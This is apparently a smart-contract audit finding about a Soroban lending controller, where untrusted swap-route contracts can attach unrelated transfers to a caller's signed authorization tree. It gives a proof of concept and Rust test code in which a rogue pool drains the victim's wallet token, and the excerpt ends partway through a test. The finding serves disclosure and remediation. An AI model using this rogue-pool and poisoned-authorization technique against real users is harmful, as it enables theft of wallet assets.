### Title
Untrusted swap-route contracts can attach unrelated caller-authorized transfers and steal wallet assets - (File: contracts/controller/src/strategies/swap.rs)

### Summary
`swap_collateral`, `multiply`, `swap_debt`, and `repay_debt_with_collateral` execute caller-supplied route bytes while the caller's top-level authorization is active. A route-selected contract can invoke an unrelated token or NFT transfer from the caller; Soroban records that call as a child of the caller's authorization tree, and it succeeds if the submitted signature covers that tree. The controller's exact controller-to-router transfer authorization and balance-delta checks protect routed funds only, not unrelated assets held by the caller.

### Finding Description
`require_authorized_caller` calls `caller.require_auth()` at the start of strategy execution. [1](#0-0)  The controller then invokes the configured swap aggregator with caller-controlled `swap` bytes. [2](#0-1)  Those bytes determine which venue/pool addresses the router calls, and the production scope does not allowlist route venues. [3](#0-2) 

The controller separately authorizes only one exact controller-owned input-token transfer for the router. [4](#0-3)  However, that restriction does not prevent a contract reached by the route from calling another contract that calls `caller.require_auth()`. During simulation, the unauthorized-looking transfer is recorded as an additional `sub_invocation` under the caller's signed controller call. If the caller signs the simulated tree, the host accepts it.

The included exploit fixture demonstrates this directly: a payload-selected pool calls `token.transfer(victim, attacker, amount)` while the router still returns the expected fair output. [5](#0-4)  Enforcing-mode tests show that the same transfer is rejected only when omitted from the signed tree and succeeds when the poisoned tree is signed. [6](#0-5) 

### Impact Explanation
An attacker can steal arbitrary wallet assets or transferable position NFTs that are unrelated to the lending operation. The test transfers the victim's entire unrelated token balance while still crediting the expected swap output to the lending account. [7](#0-6)  The same mechanism can attach any other invocation requiring the victim's authorization, subject to what the victim signs.

This is theft of user funds: the stolen asset need not be listed by the protocol, deposited as collateral, or otherwise known to the controller.

### Likelihood Explanation
The attack needs a malicious route selected by the victim's transaction and a signature over the additional authorization child. It does not need a privileged role, leaked key, protocol upgrade, oracle manipulation, or control of the configured router contract. An attacker-controlled route component can be introduced through the payload's unallowlisted pool/venue address.

The practical barrier is that honest transaction inspection reveals the extra authorization child. A client that displays or enforces only the expected input-transfer child prevents the transfer. Nevertheless, production callers commonly rely on simulated authorization trees, and a malicious interface or quote can present a profitable-looking strategy whose signed tree also contains the theft.

### Recommendation
Do not execute payload-selected arbitrary contracts while relying on caller authorization for the enclosing strategy.

Preferred mitigations:

- Enforce an on-chain venue allowlist containing audited pool/router contracts whose implementations cannot request unrelated caller authorization.
- Alternatively, redesign execution so caller authorization is not active while attacker-selected code runs; isolate the untrusted route in a component that can never invoke `caller.require_auth()` for unrelated assets.
- Reject simulated authorization trees containing children other than the exact expected operations, but treat wallet/client checks as defense in depth rather than the protocol fix.
- Document and enforce the expected authorization shape for every strategy endpoint.

### Proof of Concept
1. Alice owns a lending account with USDC collateral and also holds `WALLET_BALANCE` of an unrelated token.
2. The attacker deploys a pool-compatible contract whose `swap` calls `token.transfer(Alice, attacker, WALLET_BALANCE)`.
3. Alice invokes:

```text
controller.swap_collateral(
    caller = Alice,
    account_id = Alice's account,
    current = USDC market,
    from_amount = 5_000 USDC,
    new = ETH market,
    swap = route containing the attacker's pool,
)
```

4. The route still returns `FAIR_OUT_ETH`, so the controller's positive-output and final-risk checks pass.
5. Simulation records the unrelated token transfer as a child of Alice's `swap_collateral` authorization.
6. If Alice signs that returned tree, the attacker receives all `WALLET_BALANCE`, while Alice's lending account still receives the expected ETH collateral. [8](#0-7)

/// Authorizes, on behalf of the current contract, one `transfer(from, to, amount)`
/// call on `token_addr` made deeper in the next contract call (for example by
/// the pool). The entry allows no further sub-invocations.
pub fn authorize_transfer_as_current(
    env: &Env,
    token_addr: &Address,
    from: &Address,
    to: &Address,
    amount: i128,
) {
    let entry = InvokerContractAuthEntry::Contract(SubContractInvocation {
        context: ContractContext {
            contract: token_addr.clone(),
            fn_name: symbol_short!("transfer"),
            args: (from.clone(), to.clone(), amount).into_val(env),
        },
        sub_invocations: Vec::new(env),
    });
    env.authorize_as_current_contract(vec![env, entry]);

fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
